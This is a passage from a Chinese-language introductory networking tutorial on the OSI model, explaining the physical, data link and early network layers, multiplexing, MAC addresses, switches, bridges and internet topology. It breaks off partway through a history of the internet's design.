另外，俺想提醒一下：<br>　　由于本文是基于【OSI 模型】进行展开。对于 TCP/IP 模型到底算几层，这方面的争论【不】影响本文后续的内容。</p><h2 id="★OSI-概述"><a href="#★OSI-概述" class="headerlink" title="★OSI 概述"></a>★OSI 概述</h2><h3 id="◇OSI-的历史"><a href="#◇OSI-的历史" class="headerlink" title="◇OSI 的历史"></a>◇OSI 的历史</h3><p>　　“OSI”的全称是“Open System Interconnection”。先说说它的历史。<br>　　上世纪70年代，“国际电信联盟”（ITU）想对各国的电信系统（电话/电报）建立标准化的规格；与此同时，“国际标准化组织”（ISO）想要建立某种统一的标准，使得不同公司制造的大型主机可以相互联网。<br>　　后来，这两个国际组织意识到：“电信系统互联”与“电脑主机互联”的性质差不多。于是 ISO 与 ITU 就决定合作，两家一起干。这2个组织的2套班子，从上世纪70年代开始搞，搞来搞去，搞了很多年，一直到1984年才终于正式发布 OSI 标准。</p><h3 id="◇OSI-标准的两个组成部分"><a href="#◇OSI-标准的两个组成部分" class="headerlink" title="◇OSI 标准的两个组成部分"></a>◇OSI 标准的两个组成部分</h3><p>　　严格来讲，OSI 包括两大部分——<br>其一，抽象的概念模型，也就是前面提到的【OSI model】；<br>其二，针对这个概念模型的具体实现（具体的通讯协议），洋文叫做【OSI protocols】。</p><p>　　（前面说了）OSI 是由 ISO ＆ ITU 联手搞出来滴。这两个国际组织里面的人，要么是来自各国的电信部门，要么是来自各国的高校学者。总而言之，既有严重的官僚风气，又有明显的学究风气。（正是因为这两种风气叠加，所以搞了很多年，才搞出 OSI）<br>　　OSI 的协议实现（OSI protocols），不客气地说，就是一堆垃圾——据说把 OSI protocols 所有的协议文档，全部打印成 A4 纸，摞起来得有一米多高！是不是很吓人？协议搞得如此复杂，严重违背了 IT 设计领域的 <a href="https://en.wikipedia.org/wiki/KISS_principle">KISS 原则</a>。<br>　　由于 OSI protocols 实在太复杂，后来基本没人用。但 OSI model 反而广为流传，并且成为“网络分层模型”中名气最大，影响力最广的一个。<br>　　因此，本文后续章节中，凡是提到 OSI，指的是【OSI model】。</p><h3 id="◇OSI-模型的7层"><a href="#◇OSI-模型的7层" class="headerlink" title="◇OSI 模型的7层"></a>◇OSI 模型的7层</h3><p>　　OSI 模型总共分7层，示意图参见如下表格：</p><table><thead><tr><th>层次</th><th>中文名</th><th>洋文名</th></tr></thead><tbody><tr><td>第7层</td><td>应用层</td><td>Application Layer</td></tr><tr><td>第6层</td><td>表示层</td><td>Presentation Layer</td></tr><tr><td>第5层</td><td>会话层</td><td>Session Layer</td></tr><tr><td>第4层</td><td>传输层</td><td>Transport Layer</td></tr><tr><td>第3层</td><td>网络层</td><td>Network Layer</td></tr><tr><td>第2层</td><td>数据链路层</td><td>Data Link Layer</td></tr><tr><td>第1层</td><td>物理层</td><td>Physical Layer</td></tr></tbody></table><p>（注：为了打字省力，在后续章节把“数据链路层”直接称为“链路层”）</p><p>　　考虑到本文是针对一般性读者的【扫盲教程】，俺重点聊第1~4层。搞明白这几个层次之后，有助于你更好地理解网络的很多概念，也有助于你更好地理解很多信息安全的概念。<br>　　接下来在讨论 OSI 的每个层次时，俺都会专门写一个小节，谈该层次的【必要性】。搞明白【必要性】，你就知道为啥要引入这个层次。</p><h2 id="★物理层：概述"><a href="#★物理层：概述" class="headerlink" title="★物理层：概述"></a>★物理层：概述</h2><h3 id="◇物理层的必要性"><a href="#◇物理层的必要性" class="headerlink" title="◇物理层的必要性"></a>◇物理层的必要性</h3><p>　　通俗地说：直接与物理介质打交道的层次，就是物理层。这一层的必要性比较明显。<br>　　因为所有的通讯，归根结底都要依赖于【物理介质】。与物理介质打交道，需要牵涉到很多与【物理学】相关的东东。比如：“无线电通讯”需要关心“频率/波长”；电缆通讯需要跟“电压”打交道；“光纤通讯”需要关心“玻璃的折射率＆光线的入射角” ……<br>　　“物理层”的主要职责是：屏蔽这些细节，使得“物理层”之上的层次不用再去操心物理学。</p><h3 id="◇物理信道的类型"><a href="#◇物理信道的类型" class="headerlink" title="◇物理信道的类型"></a>◇物理信道的类型</h3><p>　　何为“物理信道”，在本文开篇的“基本概念”已经提到了。<br>　　对于“物理信道”，还可以进一步细分为如下三大类：<br>\1. 有线信道（比如：双绞线、同轴电缆、光纤、等等）<br>\2. 无线信道（比如：微波通讯、电台广播、卫星通讯、等等）<br>\3. 存储信道</p><p>　　“存储信道”比较少见，很多人没听说过，稍微解释一下。<br>　　假设你要把一大坨信息传送给另一个人，除了用“有线 or 无线”这两种通讯方式，还可以把信息先保存到某种【存储介质】（比如硬盘），然后再把存储介质用某种方式（比如快递）转交给对方。这就是所谓的“存储信道”。</p><h3 id="◇信噪比（Signal-to-noise-ratio）"><a href="#◇信噪比（Signal-to-noise-ratio）" class="headerlink" title="◇信噪比（Signal-to-noise ratio）"></a>◇<a href="https://zh.wikipedia.org/wiki/%E4%BF%A1%E5%99%AA%E6%AF%94">信噪比</a>（Signal-to-noise ratio）</h3><p>　　俺在很多篇关于“学习＆心理学”的博文中提到过【信噪比】这个概念。其实这个概念是从通讯领域借用的术语。<br>　　对于“物理信道”，总是会存在某些环境干扰，称之为“噪声”（Noise）。“信道传输的有用信息”与“无用的干扰噪声”，这两者的比值就是“信噪比”。<br>　　“信噪比”单位是【分贝】。“分贝”洋文叫做“<a href="https://en.wikipedia.org/wiki/Decibel">decibel</a>”（简写为 dB）。“deci”表示“十进制”；“bel”是为了纪念大名鼎鼎的贝尔（电话它爹）。</p><h3 id="◇带宽的限制因素"><a href="#◇带宽的限制因素" class="headerlink" title="◇带宽的限制因素"></a>◇带宽的限制因素</h3><p>　　“物理信道”要依赖于物理传输介质。不管使用何种物理介质，都要受限于某些基本的物理学定律（比如“光速上限”）。另外，不管何种物理介质，总是会有或多或少的环境干扰（噪声）。这两个因素导致了：任何“物理信道”的最大传输率总是有限滴。<br>　　由于物理层是最底下的一层，物理层之上的其它层次总是要直接或间接地依赖【物理信道】。因此，其它层次建立的“逻辑信道”，其带宽只会比“物理信道”的最大带宽更小。换句话说：“物理信道”的带宽上限也就是整个协议栈的带宽上限。</p><h3 id="◇多路复用（Multiplexing）"><a href="#◇多路复用（Multiplexing）" class="headerlink" title="◇多路复用（Multiplexing）"></a>◇<a href="https://zh.wikipedia.org/wiki/%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8">多路复用</a>（Multiplexing）</h3><p>　　一般来说，凡是能实现【长距离】通讯的“物理信道”，都有相当的经济成本。比如铺设“光纤、同轴电缆”都要花钱。无线电通讯虽然免去了铺设线路的成本，但需要竞标购买频段。因此，物理信道非常强调“多路复用”。<br>　　所谓的“多路复用”，通俗地说就是：尽可能地共享物理信道，不要浪费了。<br>　　“多路复用”有很多种类型；不同的类型，原理也不同。为了展示各种不同的原理，俺拿【无线通信】来说事儿。<br>　　无线通信领域的“多路复用”，【至少】有如下几种：</p><p><strong>频分多路复用/FDM（Frequency-Division Multiplexing）</strong><br>　　这个最简单，就是根据频率拆分。不同的线路占用不同的频段，互不干扰。（电台广播用的就是这个思路）<br>　　但这个思路的缺点很明显——<br>其一，要依赖足够宽的频段（频段是稀缺资源）；<br>其二，不同线路的流量可能会动态变化。如果某个线路空闲，其占用的频段就浪费了。<br>　　（注：光纤通讯中有个“波分多路复用/WDM”，本质上就是 FDM）</p><p><strong>时分多路复用/TDM（Time-Division Multiplexing）</strong><br>　　这种思路只用一个很窄的频段。为了在同一个频道发送多个信道，采用【分时机制】，把时间切割成很小的时间片，每个线路占用一个时间片。周而往复。<br>　　这个思路有点像十字路口的红绿灯——每隔一段时间，其中一条路可以通行。<br>　　这个思路的优点是：可以只使用一个很窄的频段。缺点是：线路越多，每条线路等待越久；即使某个线路空闲，依然会占用时间片（浪费了资源）。</p><p><strong>码分多路复用/CDM（Code-Division Multiplexing）</strong><br>　　这种思路采用某种【编码】的技巧，使得多个端点可以在同一个时间点使用同一频段发送数据；由于他们采用不同的编码方式，不会相互干扰。<br>　　一般来说，CDM 要依赖于“扩频技术”（<a href="https://en.wikipedia.org/wiki/Spread_spectrum">spread spectrum</a>），需占用一个比较宽的频道范围。这算是缺点。但其优点很明显——<br>其一，可以支持 N 个线路（N 动态变化）；<br>其二，即使任何一个线路的流量动态变化，也不会浪费物理信道的资源。<br>　　显然，这种思路明显优于 FDM ＆ TDM。如今在移动通讯领域大名鼎鼎的 CDMA（码分多址），采用的就是这个思路。</p><h2 id="★物理层：具体实例"><a href="#★物理层：具体实例" class="headerlink" title="★物理层：具体实例"></a>★物理层：具体实例</h2><h3 id="◇物理层的【协议】"><a href="#◇物理层的【协议】" class="headerlink" title="◇物理层的【协议】"></a>◇物理层的【协议】</h3><p>　　物理层的协议主要有如下：<br><a href="https://en.wikipedia.org/wiki/Universal_Serial_Bus">USB 协议</a><br><a href="https://en.wikipedia.org/wiki/List_of_Bluetooth_protocols">蓝牙协议</a>的一部分<br><a href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a href="https://en.wikipedia.org/wiki/IEEE_802.16">IEEE 802.16</a>（WiMAX）<br><a href="https://en.wikipedia.org/wiki/IEEE_1394">IEEE 1394</a>（火线接口）<br><a href="https://en.wikipedia.org/wiki/RS-232">RS-232 协议</a>（串行接口/串口）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p><h3 id="◇物理层的【协议实现】"><a href="#◇物理层的【协议实现】" class="headerlink" title="◇物理层的【协议实现】"></a>◇物理层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件”包含了物理层的协议实现（参见如下示意图）<br>　　另外，还有一些专门的【1层】网络设备，也提供物理层的功能（参见下一个小节）。</p><p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p><h3 id="◇物理层相关的【网络设备】"><a href="#◇物理层相关的【网络设备】" class="headerlink" title="◇物理层相关的【网络设备】"></a>◇物理层相关的【网络设备】</h3><p><strong><a href="https://zh.wikipedia.org/wiki/%E8%B0%83%E5%88%B6%E8%A7%A3%E8%B0%83%E5%99%A8">调制解调器</a>（modem）</strong><br>　　通俗地说，“调制解调器”就是用来翻译“数字信号 ＆ 模拟信号”。<br>　　在发送信息时，modem 把电脑要发送的“字节流”（数字信号）翻译成“模拟信号”，然后通过物理介质发送出去；当它从物理介质收到“模拟信号”，再翻译成“数字信号”，传回给电脑。<br>　　早期的拨号上网，modem 面对的物理介质是“固话线路”；如今家庭宽带普及，光纤入户，modem 面对的物理介质是“光纤线路”。</p><p><img src="https://lh6.googleusercontent.com/nfl3YFl3Bgg13u0xQV0CsGvLSObLDDbGI5wuDcGTulde_klpLWZX9fhpGbiE1SgAJYBDVUtrM4MwjV5Hy6DYA5YC7gKyVaQs-xy_kUdC1jm1hWnAuHdq9q3VDhxoMPbJxEYlL6pONFw" alt="不见图 请翻墙"><br>（老式 modem，用于固定电话线路）</p><p><strong><a href="https://en.wikipedia.org/wiki/Repeater">中继器</a>（repeater）</strong><br>　　信号在物理介质中传输，会出现【衰减】（不论是“有线 or 无线”都有可能衰减）。“中继器”的作用是【信号增益】，使得信号能传得更远。<br>　　另外，比如“微波通讯”是直线传播，而地球表面有弧度，还有地形的起伏。所以每隔一定距离要建“微波塔”。这玩意儿也相当于“中继器”。</p><p><img src="https://lh4.googleusercontent.com/DQOkSWCmJO86Vc1hNJhGONs8j2oHbjS8hlA1XxFL7OIrdPsGT9amhbHzoKHjo8S0aTfVQYgKoBPvP0vEw8lvLEby6OubBeTkHZaV1sikpzIgvVGmLYT_nSmHMZqfJFmUowukZ5pbOoY" alt="不见图 请翻墙"><br>（微波塔示意图）</p><p><strong><a href="https://zh.wikipedia.org/wiki/%E9%9B%86%E7%B7%9A%E5%99%A8">集线器</a>（hub）</strong><br>　　可以把“集线器”视作更牛逼的“中继器”——“中继器”只有两个口（只能连接两个通讯端点），而“集线器”有多个口（同时连接多个通讯端点）。<br>　　通常所说的“集线器”是指“以太网集线器”。这种设备如今已经逐步淘汰，很少见到了。</p><p><img src="https://lh3.googleusercontent.com/JdWYf1BMAyz3Td7XLh7Yuu0YxQLtIzhWHvPhp_xXszrTH-MPiarsWjh9zyL-0Mx0ysRbxANYwaoH6J5OAUC8Hkd58Wx0TIu5D5-AtmWoDpGnGs9aOu7T3Uzc8bYWcUmu5ZCVEH14L44" alt="不见图 请翻墙"><br>（老式的10兆以太网集线器）</p><p>　　另外，很多同学应该都用过“USB hub”，就是针对 USB 线的“集线器”（“USB 线”也可以视作某种通讯介质）。</p><h2 id="★链路层：概述"><a href="#★链路层：概述" class="headerlink" title="★链路层：概述"></a>★链路层：概述</h2><h3 id="◇链路层的必要性"><a href="#◇链路层的必要性" class="headerlink" title="◇链路层的必要性"></a>◇链路层的必要性</h3><p><strong>对信息的打包</strong><br>　　物理层传输的信息，通俗地说就是【比特流】（也就是一长串比特）。但是对于计算机来说，“比特流”太低级啦，处理起来极不方便。“链路层”要干的第一个事情，就是把“比特流”打包成更大的一坨，以方便更上层的协议进行处理。在 OSI 模型中，链路层的一坨，称之为“帧”（frame）。</p><p><strong>差错控制</strong><br>　　物理介质的传输，可能受到环境的影响。这种影响不仅仅体现为“噪声”，有时候会出现严重的干扰，导致物理层传输的“比特流”出错（某个比特“从0变1”或“从1变0”）。因此，链路层还需要负责检查物理层的传输是否出错。在 IT 行话中，检测是否出错，称之为“差错控制机制”（后面有一个小节会简单说一下这个话题）。</p><p><strong>流量控制</strong><br>　　假设两个端点通过同一个物理信道进行通讯，这两个端点处理信息的速度可能不同。如果发送方输出信息的速度超过接收方处理信息的速度，通讯就会出问题。于是就需要有某种机制来协调，确保发送方的发送速度不会超出接收方的处理速度。在技术行话中，这称之为“流量控制”，简称“流控”。</p><p><strong>信道复用</strong><br>　　在上一个章节已经讲到：用于远距离通讯的“物理介质”，总是有成本。因此需要对物理信道进行“多路复用”，就会导致多个端点共用同一个物理信道。如果同时存在多个发送者和多个接收者。接收者如何知道某个信息是发给自己而不是别人？<br>　　另外，某些物理介质可能不支持并发（无法同时发送信息）。某些物理介质可能是【半双工】，所有这些物理层的限制，都使得“多路复用”变得复杂。为了解决这些问题，链路层需要提供了某种相应的机制（协议），术语叫做“介质访问控制”（洋文是“Media Access Control”，简称 MAC）。后续小节会聊它。</p><h3 id="◇差错控制"><a href="#◇差错控制" class="headerlink" title="◇差错控制"></a>◇差错控制</h3><p>　　为了发现传输的信息是否出错，设计了很多相应的数学算法。这些算法大体分为两类：“检错算法 ＆ 纠错算法”。<br>　　简而言之，“检错算法”只能检测出错误，而“纠错算法”不但能检测出错误，还能纠正错误。很显然，“纠错算法”更牛逼，但是它也更复杂。<br>　　常见的“检错算法”对传输的数据计算出一个【校验值】，接收方收到数据会重新计算校验和，如果算出来不对，就把收到的数据丢弃，让对方重发。“校验算法”的原理类似于《<a href="https://program-think.blogspot.com/2013/02/file-integrity-check.html">扫盲文件完整性校验——关于散列值和数字签名</a>》一文中提到的“散列算法/哈希算法”。<br>　　“纠错算法”更高级，由于涉及到更多数学，俺就不展开啦。<br>　　对于【无线】物理信道，由于出错的概率更高，并且重新传输数据的成本也更高。所以【无线】通讯的链路层协议，更倾向于用【纠错】机制；作为对比，【有线】通讯的链路层协议，更倾向于用【检错】机制。</p><h3 id="◇MAC-协议"><a href="#◇MAC-协议" class="headerlink" title="◇MAC 协议"></a>◇<a href="https://en.wikipedia.org/wiki/Medium_access_control">MAC 协议</a></h3><p>　　“MAC 协议”用来确保对下层物理介质的使用，不会出现冲突。为了形象，俺拿“铁路系统”来比喻，说明“MAC 协议”的用途。<br>　　假设有一条【单轨】铁路连接 A/B 两地。有很多火车想从 A 开到 B，同时还有很多火车想从 B 开到 A。<br>　　首先，要确保不发生撞车（如果已经有车在 A 开往 B 的途中，那么 B 就不能再发车）；其次，即使是同一个方向的车，出发时间也要错开一个时间间隔。<br>　　所有这些协调工作，都是靠“MAC 协议”来搞定。</p><h3 id="◇MAC-地址"><a href="#◇MAC-地址" class="headerlink" title="◇MAC 地址"></a>◇MAC 地址</h3><p>　　为了完成上述任务，光有“MAC 协议”还不够，还需要为每一个端点引入【惟一的】标识。这个标识就称作“MAC 地址”。<br>　　通俗地说，每个网卡都内置了一个“MAC 地址”。这个地址是网卡在出厂的时候就已经设置好的，并且用某种机制确保该地址【全球唯一】。</p><p>　　如何保证 MAC 地址全球唯一捏？简单说一下：<br>　　MAC 地址包含6个字节（48个比特），分为两半。第一部分称作【OUI】，OUI 的24个比特中，其中2个比特有特殊含义，其它22个比特，用来作为网卡厂商的唯一编号。这个编号由国际组织 IEEE 统一分配。<br>　　MAC 地址第二部分的24比特，由网卡厂商自己决定如何分配。每个厂商只要确保自己生产的网卡，后面这24比特是唯一的，就行啦。</p><p><img src="https://lh6.googleusercontent.com/p1BJLdyURQLXwjaX9w6zrYxmzkFitCfuXYxEnQ8o2WaciD67PpWKUzx2MM4s7ay2Ds9Ltn4oHERF0uq17z_zaEIZFvRBqDb2U7WUPtAVM9Cve1_BUtd8Emx-073rj3jpizDMZRwdQ5o" alt="不见图 请翻墙"><br>（MAC 地址的构成）</p><p>　　由于俺在很多安全教程中鼓吹大伙儿使用“<a href="https://program-think.blogspot.com/2012/10/system-vm-0.html">操作系统虚拟机</a>”，再顺便说说【虚拟网卡】的 MAC 地址。<br>　　“虚拟网卡”是由【虚拟化软件】创建滴。IEEE 也给每个虚拟化软件的厂商（含开源社区）分配了唯一的 OUI。因此，虚拟化软件在创建“虚拟网卡”时，会使用自己的 OUI 生成前面24个比特；后面的24比特，会采用某种算法使之尽可能【随机化】。由于“2的24次方”很大（<code>224 = 16777216</code>），碰巧一样的概率很低。<br>　　（注：如果手工修改 MAC 地址，故意把两块网卡的 MAC 地址搞成一样，那确实就做不到唯一性了。并且会导致链路层的通讯出问题）</p><h2 id="★链路层：具体实例"><a href="#★链路层：具体实例" class="headerlink" title="★链路层：具体实例"></a>★链路层：具体实例</h2><h3 id="◇链路层的【协议】"><a href="#◇链路层的【协议】" class="headerlink" title="◇链路层的【协议】"></a>◇链路层的【协议】</h3><p>　　链路层的协议主要有如下：<br><a href="https://en.wikipedia.org/wiki/Media_access_control">MAC 协议</a>（介质访问控制）<br><a href="https://en.wikipedia.org/wiki/Logical_link_control">LLC 协议</a>（逻辑链路控制）<br><a href="https://en.wikipedia.org/wiki/Address_Resolution_Protocol">ARP 协议</a>（解析 MAC 地址）<br><a href="https://en.wikipedia.org/wiki/IEEE_802.3">IEEE 802.3</a>（以太网）<br><a href="https://en.wikipedia.org/wiki/IEEE_802.11">IEEE 802.11</a> 的一部分（Wi-Fi）<br><a href="https://en.wikipedia.org/wiki/Layer_2_Tunneling_Protocol">L2TP 协议</a>（2层VPN）<br><a href="https://en.wikipedia.org/wiki/Point-to-Point_Protocol">PPP 协议</a>（拨号上网）<br><a href="https://en.wikipedia.org/wiki/Serial_Line_Internet_Protocol">SLIP 协议</a>（拨号上网）<br>……<br>（考虑到篇幅）俺不可能具体细聊这些协议，只是贴出每个的维基百科链接，感兴趣的同学自己点进去看。</p><h3 id="◇链路层的【协议实现】"><a href="#◇链路层的【协议实现】" class="headerlink" title="◇链路层的【协议实现】"></a>◇链路层的【协议实现】</h3><p>　　对于电脑主机（含移动设备），“网卡硬件 ＆ 网卡驱动”会包含链路层协议的实现（参见如下示意图）。<br>　　另外，还有一些专门的【2层】网络设备，也提供链路层的功能（参见下一个小节）。</p><p><img src="https://lh4.googleusercontent.com/uYGaEvDYmziV-6EZ1AnRskoGpyKwxBcHgV5wgVtsDKmyP37OQgfX_zPYYeV3drFWBATFb95DYIwMPCgNApfg9Vtxrrpyvept6LNDQi0Vh3Fp6d31LFarI4ZjY1mSaQqP94HJaVQHBEQ" alt="不见图 请翻墙"><br>（OSI 模型中，不同层次的协议实现）</p><h3 id="◇链路层相关的【网络设备】"><a href="#◇链路层相关的【网络设备】" class="headerlink" title="◇链路层相关的【网络设备】"></a>◇链路层相关的【网络设备】</h3><p><strong><a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E8%B7%AF%E4%BA%A4%E6%8F%9B%E5%99%A8">网络交换机</a>（network switch）</strong><br>　　（注：一般提到“网络交换机”，如果不加定语，指的就是“2层交换机”；此外还有更高层的交换机，在后续章节介绍）<br>　　为啥要有交换机捏？俺拿“以太网的发展史”来说事儿。<br>　　以太网刚诞生的时候，称之为“经典以太网”，电脑是通过【集线器】相连。“集线器”前面提到过，工作在【1层】（物理层），并不理解链路层的协议。因此，集线器的原理是【广播】模式——它从某个网线接口收到的数据，会复制 N 份，发送到其它【每个】网线接口。假设有4台电脑（A、B、C、D）都连在集线器上，A 发数据给 B，其实 C ＆ D 也都收到 A 发出的数据。显然，这种工作模式很傻逼（低效）。由于“经典以太网”的工作模式才“10兆”，所以集线器虽然低效，还能忍受。<br>　　后来要发展“百兆以太网”，再用这种傻逼的广播模式，就不能忍啦。于是“经典以太网”就发展为“交换式以太网”。用【交换机】代替“集线器”。<br>　　交换机是工作在2层（链路层）的设备，能够理解链路层协议。当交换机从某个网线接口收到一份数据（链路层的“帧”），它可以识别出“链路帧”里面包含的目标地址（接收方的 MAC 地址），然后只把这份数据转发给“目标 MAC 地址相关的网线接口”。<br>　　由于交换机能识别2层协议，它不光比集线器的性能高，而且功能也强得多。比如（稍微高级点的）交换机可以实现“MAC 地址过滤、VLAN、QoS”等多种额外功能。</p><p><strong><a href="https://zh.wikipedia.org/wiki/%E6%A1%A5%E6%8E%A5%E5%99%A8">网桥/桥接器</a>（network bridge）</strong><br>　　“交换机”通常用来连接【同一种】网络的设备。有时候，需要让两台不同网络类型的电脑相连，就会用到【网桥】。<br>　　下面以“操作系统虚拟机”来举例（完全没用过虚拟机的同学，请跳过这个举例）。<br>　　在<a href="https://program-think.blogspot.com/2012/12/system-vm-5.html">这篇博文</a>，俺介绍了虚拟机的几种“网卡模式”，其中有一种模式叫做【bridge 模式】。一旦设置了这种模式，Guest OS 的虚拟网卡，对于 Host OS 所在的外部网络，是【双向】可见滴。也就是说，物理主机所在的外部网络，也可以看见这块虚拟网卡。<br>　　现在，假设你的物理电脑（Host OS）只安装了【无线网卡】（WiFi），而虚拟化软件给 Guest OS 配置的通常是【以太网卡】。显然，这是两种【不同】的网络。为啥 Guest OS 的以太网卡设置为“bridge 模式”之后，外部 WiFi 网络可以看到它捏？<br>　　奥妙在于——虚拟化软件在内部悄悄地帮你实现了一个“网桥”。这个网桥把“Host OS 的 WiFi 网卡”与“Guest OS 的以太网卡”关联起来。WiFi 网卡收到了链路层数据之后，如果接收方的 MAC 地址对应的是 Guest OS，网桥会把这份数据丢给 Guest OS 的网卡。<br>　　这种网卡模式之所以称作“bridge 模式”，原因就在于此。</p><h3 id="◇链路层相关的【软件工具】"><a href="#◇链路层相关的【软件工具】" class="headerlink" title="◇链路层相关的【软件工具】"></a>◇链路层相关的【软件工具】</h3><p><strong>嗅探抓包工具（Sniffer）</strong><br>　　要了解链路层的数据包结构，需要用到“嗅探工具”。这类工具能捕获流经你网卡的所有【链路层】数据包。前面聊“协议栈”的时候说过：下层数据包的载荷就是上层数据包的整体。因此，拿到【链路层】数据包也就意味着：你已经拿到2层之上的所有数据包的信息了。<br>　　有些抓包工具自带图形界面，可以直接显示数据包的内容给你看。还有些只提供命令行（只是把获取的数据包保存为文件），然后要搭配其它图形化的工具来展示数据包的内容。<br>　　抓包的工具有很多，名气最大的是 <a href="https://en.wikipedia.org/wiki/Wireshark">Wireshark</a>（原先叫做 Ethereal）。</p><p><strong>ARP 命令</strong><br>　　首先，ARP 是“MAC 地址解析协议”的洋文名称。该协议根据“IP 地址”解析“MAC 地址”。<br>　　Windows 自带一个同名的 <code>arp</code> 命令，可以用来诊断与“MAC 地址”相关的信息。比如：列出当前子网中其它主机的 IP 地址以及对应的 MAC 地址。这个命令在 Linux ＆ Mac OS 上也有。</p><h2 id="★网络层：概述"><a href="#★网络层：概述" class="headerlink" title="★网络层：概述"></a>★网络层：概述</h2><h3 id="◇网络层的必要性"><a href="#◇网络层的必要性" class="headerlink" title="◇网络层的必要性"></a>◇网络层的必要性</h3><p><strong>路由机制（routing）</strong><br>　　在 OSI 模型中，链路层本身【不】提供路由功能。你可以通俗地理解为：链路层只处理【直接相连】的两个端点（注：这么说不完全严密，只是帮助外行理解）<br>　　对于某个复杂网络，可能有很多端点，有很复杂的拓扑结构。当拓扑足够复杂，总有一些端点之间【没有直连】。那么，如何在这些【没有直连】的端点之间建立通讯捏？此时就需要提供某种机制，让其它端点帮忙转发数据。这就需要引入“路由机制”。<br>　　为了避免把“链路层”搞得太复杂，路由机制放到“链路层”之上来实现，也就是“网络层”。</p><p><strong>基于【路由】的地址编码方式</strong><br>　　链路层已经提供了某种全球唯一的地址编码方式（MAC 地址）。但“MAC 地址”有如下几个问题：<br>其一，它是固定的（虽然可以用技术手段去修改 MAC 地址，但很少这么干）<br>其二，MAC 地址的编码是基于【厂商】，无法体现网络拓扑结构。或者说，“MAC 地址”对于“路由机制”是不够友好滴。<br>　　因此，需要引入一种更抽象（更高层）的地址，也就是“网络层地址”。咱们常说的“IP 地址”，是“网络层地址”的实现方式之一。</p><p>　　为了帮你理解，举个例子：<br>　　每个人都有身份证号（这就类似于“MAC 地址”）。当某人加入了某个公司，公司会为此人再分配一个“员工号”（这就类似于“网络地址”）。既然有身份证号，为啥公司还要另搞一套“员工编号”捏？因为“员工编号”有额外的好处。比如说：可以把员工号划分为不同的区间，对应不同的部门。这样一来，只要看到员工号，就知道此人来自哪个部门。<br>　　类似道理，每个网卡都有自己固定的 MAC 地址，当这个网卡接入到不同的网络，每次都可以再分配不同的“网络地址”。通过“网络地址”可以看出这个网卡属于哪个网络（对路由比较方便）。</p><p><strong>网际互联（<a href="https://en.wikipedia.org/wiki/Internetworking">internetwork</a>）</strong><br>　　引入“网络层”的另一个目的是：屏蔽不同类型的网络之间的差异，从而有利于【网际互联】（也就是建立“网络的网络”）。<br>　　一般来说，要想联通【异种】网络，就要求每个网络中都有一台主机充当【网关】（gateway）。【网关】起到“中介/翻译”的作用——帮不同的网络翻译协议，使得不同的网络可以互相联通。<br>　　假设【没有】统一的网络层，网关的工作就很难做。就好比说：如果全球没有某种通用的自然语言，就需要培养非常多不同类型的翻译人才（假设有30种主要语言，任意两种互译，就需要几百种不同的翻译人才）。<br>　　反之，如果有了某种统一的网络层标准，问题就好办多了（还是假设有30种主要语言，只要选定某种作为通用语，然后培养29种翻译人才，就可以实现任意两种语言互译）。<br>　　如今的互联网时代，【IP 协议】就是那个充当统一标准的网络层协议。</p><p><img src="https://lh3.googleusercontent.com/zrXBFWSDp-D4VebTx73Un03rN3zKCjVL6Ax_VURmxZyaIj_bfr09TwYya1F6GyNz3W5JLmEvzDggkDPYuHpCdHfWjKHDHp-pBVubeDazpi7Ie9CHYbhJkVP1c48JSZJhpKn8zftthOo" alt="不见图 请翻墙"><br>（互联网整合了各种类型的网络）</p><h3 id="◇网络拓扑（network-topology）"><a href="#◇网络拓扑（network-topology）" class="headerlink" title="◇网络拓扑（network topology）"></a>◇网络拓扑（network topology）</h3><p>　　网络的拓扑结构有很多种，有简单的，有复杂的。一般来说，再复杂的拓扑，也可以逐步分解为若干简单拓扑的组合。<br>　　对拓扑的研究，有专门一个数学分支（拓扑学）。考虑到本文只是扫盲，俺不可能再去聊“拓扑学”。因此，只挑几种简单的拓扑结构，让大伙儿有个直观的印象。</p><p><img src="https://lh5.googleusercontent.com/ccFqOwvxYuPyelLkW1KRh77tNfUR3TCMMSFN0YgJKJSUfBWISxnzj7mRKLvAP5FvCb2YJDZ8aZO7wRKslvltbWm5fn0QJk3uWp5F3xQy_GFXWVx__c1kDD-cV7HHejxuwqvR6ombf_M" alt="不见图 请翻墙"><br>（常见的网状拓扑结构：星形拓扑、环形拓扑、总线拓扑、网状拓扑、等等）</p><p>　　如今的互联网，整体的拓扑结构超级复杂。但还是可以逐步分解为上述几种基本的拓扑结构。</p><p><img src="https://lh3.googleusercontent.com/l2JVK5up10o5jLkXzIgrcNcTBpnXtmeBKxyHqhuxmqDFlAGDF8pXDqHhRfTf7kAeNLYrgnnI0HVElnFE-JKZXpwcC2Y1f12v5bftW4_6KIYQqY-77tI_pE---r3L3Fwle2i0PTgAnEc" alt="不见图 请翻墙"><br>（互联网的复杂拓扑，右下角是图中某个小点的放大。<br>为节省大伙儿的翻墙流量，俺贴的是缩小图。点“<a href="https://upload.wikimedia.org/wikipedia/commons/d/d2/Internet_map_1024.jpg">这里</a>”看原始图）</p><h3 id="◇互联网的拓扑——从“历史”的角度看其健壮性"><a href="#◇互联网的拓扑——从“历史”的角度看其健壮性" class="headerlink" title="◇互联网的拓扑——从“历史”的角度看其健壮性"></a>◇互联网的拓扑——从“历史”的角度看其健壮性</h3><p>　　从上面那张图可以看出：互联网拓扑的【局部】有很多是“星形拓扑”（当然也有其它的）。但从【宏观】上看，更像是“网状拓扑”。<br>　　在现实生活中，对于复杂结构，通常都会采用“树状层次结构”，以便于管理。比如：域名系统、公司组织结构、官僚系统 …… 那为啥互联网的【宏观】拓扑结构是“网状”捏？这就要说到互联网的历史。</p><p>　　在上世纪50年代（冷战高峰期），美国军方的指挥系统高度依赖于电信公司提供的电话网络。当时的电话网络大致如下——<br>在基层，每个地区有电话交换局，每一部电话都连入当地的交换局。<br>在全国，设有若干个长途局，每个交换局都接入某个特定的长途局（不同地区的交换局通过长途局中转）。<br>　　